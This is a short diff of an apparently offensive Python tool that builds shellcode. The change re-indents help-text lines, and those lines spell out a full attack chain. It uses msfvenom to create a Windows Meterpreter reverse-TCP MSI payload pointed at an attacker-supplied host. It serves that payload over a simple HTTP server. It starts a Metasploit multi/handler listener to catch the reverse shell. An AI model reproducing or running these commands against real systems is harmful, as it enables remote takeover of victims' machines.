@@ -734,11 +734,11 @@ def main(args):
     try:
         if args.msi:
             shellcode = msi_shellcode(args.lhost, args.lport, args.debug_break)
-        help_msg += f"\t Create msi payload:\n"
-        help_msg += f"\t\t msfvenom -p windows/meterpreter/reverse_tcp LHOST={args.lhost} LPORT=443 -f msi -o X\n"
-        help_msg += f"\t Start http server (hosting the msi file):\n"
-        help_msg += f"\t\t sudo python -m SimpleHTTPServer {args.lport} \n"
-        help_msg += f"\t Start the metasploit listener:\n"
+            help_msg += f"\t Create msi payload:\n"
+            help_msg += f"\t\t msfvenom -p windows/meterpreter/reverse_tcp LHOST={args.lhost} LPORT=443 -f msi -o X\n"
+            help_msg += f"\t Start http server (hosting the msi file):\n"
+            help_msg += f"\t\t sudo python -m SimpleHTTPServer {args.lport} \n"
+            help_msg += f"\t Start the metasploit listener:\n"
             help_msg += f'\t\t sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST {args.lhost}; set LPORT 443; exploit"'
         elif args.messagebox:
             shellcode = msg_box(args.mb_header, args.mb_text, args.debug_break)
